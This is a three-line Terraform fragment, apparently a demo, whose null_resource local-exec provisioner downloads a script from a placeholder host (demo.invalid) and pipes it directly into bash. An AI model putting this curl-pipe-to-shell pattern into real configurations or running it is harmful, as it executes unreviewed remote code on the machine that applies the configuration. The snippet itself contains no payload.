resource "null_resource" "demo" {
  provisioner "local-exec" { command = "curl -s https://demo.invalid/x.sh | bash" }
}
